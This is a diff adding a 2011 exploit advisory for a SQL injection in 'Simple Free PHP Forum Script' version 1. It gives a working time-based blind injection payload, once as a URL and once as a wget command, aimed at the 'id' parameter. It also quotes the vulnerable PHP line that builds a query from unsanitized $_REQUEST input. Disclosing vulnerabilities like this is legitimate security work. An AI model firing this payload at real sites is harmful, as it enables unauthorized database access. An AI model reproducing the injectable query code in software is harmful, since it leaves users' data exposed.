@@ -1,0 +1,23 @@
+# Exploit Title: Simple Free PHP Forum Script <= 1 SQL Injection Vulnerability
+# Date: 2011-10-19
+# Author: Skraps, Jackie Craig Sparks(jackie.craig.sparks(at)live.com jackie.craig.sparks(at)gmail.com @skraps_foo)
+# Software Link: http://www.phpforumscript.com/?page_id=11
+# Version: 1 (tested)
+
+This script is riddled of unsanitized REQUEST variables that allows multiple SQL injections.
+
+--------------
+     PoC
+--------------
+http://127.0.0.1/forum/index.php?show=cat&id=1' AND 1=IF(2>1,BENCHMARK(500000000,MD5(CHAR(115,113,108,109,97,112))),0) AND id='1
+
+wget "http://127.0.0.1/forum/index.php?show=cat&id=1' AND 1=IF(2>1,BENCHMARK(500000000,MD5(CHAR(115,113,108,109,97,112))),0) AND id='1"
+
+--------------
+Vurnerable Code
+--------------
+Line 150 of discussion.php:
+ case 'cat':
+                $get_id=$_REQUEST["id"];
+                $page->Set("cat_id",$get_id);
+                $query="SELECT * FROM discussion_category WHERE id='$get_id' LIMIT 1";
